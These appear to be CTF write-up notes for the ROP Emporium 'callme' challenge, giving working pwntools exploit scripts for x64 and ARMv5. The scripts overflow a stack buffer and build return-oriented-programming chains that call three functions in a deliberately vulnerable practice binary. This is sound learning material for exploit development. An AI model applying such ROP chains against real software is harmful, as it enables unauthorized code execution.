## x64
---
- Had to call 3 functions each with the same three arguments. Luckily was a curated gadget for `pop rdi; pop rsi; pop rdx; ret`
### solve
```python
#!/usr/bin/env python3

from pwn import *

exe = "./callme"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

offset = 40

pop_rdi_rsi_rdx = 0x40093C

rop = ROP(exe)
rop.raw(pop_rdi_rsi_rdx)
rop.raw(0xDEADBEEFDEADBEEF)
rop.raw(0xCAFEBABECAFEBABE)
rop.raw(0xD00DF00DD00DF00D)
rop.raw(elf.sym.callme_one)
rop.raw(pop_rdi_rsi_rdx)
rop.raw(0xDEADBEEFDEADBEEF)
rop.raw(0xCAFEBABECAFEBABE)
rop.raw(0xD00DF00DD00DF00D)
rop.raw(elf.sym.callme_two)
rop.raw(pop_rdi_rsi_rdx)
rop.raw(0xDEADBEEFDEADBEEF)
rop.raw(0xCAFEBABECAFEBABE)
rop.raw(0xD00DF00DD00DF00D)
rop.raw(elf.sym.callme_three)

payload = flat({offset: rop.chain()})

context.log_level = "debug"
io = gdb.debug(exe, "b main\nc")
io.sendafter(b"> ", payload)
io.interactive()
```

## ARMv5
---
- There's a really handy `pop {r0, r1, r2, lr, pc};` gadget we can abuse
	- If we keep putting the address of the above gadget in `lr`, we'll keep returning to it, allowing us to repeatedly assert control over these 5 crucial registers
### solve
```python
#!/usr/bin/env python3

from pwn import *

exe = "./callme_armv5"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

# 0x00010870: pop {r0, r1, r2, lr, pc};
pop_r0_r1_r2_lr_pc = p32(0x10870)
callme1 = p32(elf.sym.callme_one)
callme2 = p32(elf.sym.callme_two)
callme3 = p32(elf.sym.callme_three)

args = b""
args += p32(0xdeadbeef)
args += p32(0xcafebabe)
args += p32(0xd00df00d)

# keeps returning to the pop3 addr and shoving the function addr in pc
payload = b""
payload += pop_r0_r1_r2_lr_pc
payload += args + pop_r0_r1_r2_lr_pc + callme1
payload += args + pop_r0_r1_r2_lr_pc + callme2
payload += args + pop_r0_r1_r2_lr_pc + callme3

offset = 36
payload = flat({offset: payload})

context.log_level = "debug"
io = gdb.debug(exe, "c")
io.sendafter(b"> ", payload)
io.interactive()
```


